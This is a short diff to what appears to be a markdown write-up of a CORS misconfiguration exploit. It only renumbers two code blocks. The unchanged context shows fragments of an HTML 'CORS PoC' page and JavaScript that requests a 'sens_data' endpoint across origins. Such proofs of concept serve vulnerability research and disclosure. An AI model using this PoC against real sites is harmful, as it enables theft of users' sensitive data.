@@ -38,7 +38,7 @@
 
 ## **Exploit:**
 
-
+    #1
     <html>
 	    <body>
              <h2>CORS PoC</h2>
@@ -63,7 +63,7 @@
      </html>
 	
 	     
-	#1
+	#2
 	var req = new XMLHttpRequest();
 	req.onload = reqListener;
 	req.open('get','https://exaple.com/sens_data',true);
